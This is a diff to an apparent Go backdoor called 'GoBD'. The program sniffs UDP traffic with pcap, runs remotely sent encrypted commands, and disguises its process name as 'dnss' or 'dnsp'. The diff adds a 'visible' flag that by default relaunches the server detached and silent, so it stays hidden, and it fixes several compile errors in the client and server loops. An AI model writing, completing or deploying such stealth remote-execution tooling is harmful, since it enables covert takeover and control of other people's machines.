@@ -31,7 +31,6 @@ import(
 	"reflect"
 	"unsafe"
 	"flag"
-	"runtime"
 	"fmt"
 	"strings"
 	"strconv"
@@ -55,18 +54,38 @@ var authenticatedAddr string; //Currently authenticated address
 */
 func main(){
 
-	SetProcessName("dnss");
+	SetProcessName("dnsp");
 
 	//flags
-	modePtr := flag.String("mode", "client", "The mode of the application, may either be" +
-		" client or server. Defaults to client.");
-	ipPtr := flag.String("ip", "127.0.0.1", "The ip to connect to if in client mode.");
-	portPtr := flag.Int("port", 3322, "The port to connect to in client mode, or to listen on in server mode. Defaults to 3322.");
+	modePtr      := flag.String("mode", "client", "The mode of the application, may either be" +
+		         " client or server. Defaults to client.");
+	ipPtr        := flag.String("ip", "127.0.0.1", "The ip to connect to if in client mode.");
+	portPtr      := flag.Int("port", 3322, "The port to connect to in client mode, or to listen on in server mode. Defaults to 3322.");
 	interfacePtr := flag.String("iface", "eth0", "The interface for the backdoor to monitor for incoming connection, defaults to eth0.");
-	lPortPtr := flag.Int("lport", 3321, "The port for the client to listen on.");
+	lPortPtr     := flag.Int("lport", 3321, "The port for the client to listen on.");
+	hiddenPtr    := flag.String("visible", "false", "Determines whether the server will be hidden or not. true for visible and false for invisible.");
 	//flags
-	
+
 	flag.Parse();
+
+	if *hiddenPtr == "false" && *modePtr == "server" {
+
+		var procAttr os.ProcAttr 
+		procAttr.Files = []*os.File{os.Stdin, nil, nil} 
+		
+		arguments := make([]string, 7);
+		arguments[0] = "";
+		arguments[1] = fmt.Sprintf("-mode=%s", *modePtr);
+		arguments[2] = fmt.Sprintf("-ip=%s", *ipPtr);
+		arguments[3] = fmt.Sprintf("-port=%d", *portPtr);
+		arguments[4] = fmt.Sprintf("-iface=%s", *interfacePtr);
+		arguments[5] = fmt.Sprintf("-lport=%d", *lPortPtr);
+		arguments[6] = fmt.Sprint("-visible=invalid");
+		
+		_, err := os.StartProcess("./GoBD", arguments, &procAttr);
+		checkError(err);
+		return;
+	}
 
 	intiateTools();
 	
@@ -123,7 +142,7 @@ func intiateClient(ip string, port, lport int){
 		input = strings.TrimSpace(input);
 		if strings.HasPrefix(input, "!") {
 			sendEncryptedData(port, "[BD]" + input, ip);
-		} else if input == ?help {
+		} else if input == "?help" {
 			fmt.Printf("Client Usage Help\n" +
 				"=================================\n" +
 				"EXEC Commands\n" +
@@ -134,6 +153,7 @@ func intiateClient(ip string, port, lport int){
 				"These commands are prefixed by a ! and are executed on the backdoors own program options\n" +
 				"!setprocess [name]\n" +
 				"==================================\n");
+			continue;
 		} else {
 			sendEncryptedData(port, "[EXEC]" + input, ip);
 		}
@@ -183,7 +203,7 @@ func intiateServer(iface string, port, lport int){
 
 	handle, err := pcap.OpenLive(iface, 1600, true, pcap.BlockForever);
 	checkError(err);
-	err := handle.SetBPFFilter("udp");
+	err = handle.SetBPFFilter("udp");
 	checkError(err);
 
 	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
@@ -268,10 +288,10 @@ func executeServerCommand(data, ip string, port int) {
 
 	case "exit" :
 		sendEncryptedData(port, "Server exiting...\n[END]", ip);
-		runtime.Goexit();
+		os.Exit(0);
 		break;
 
-	case default :
+	default:
 		out = "Not a valid command.\n";
 	}
 
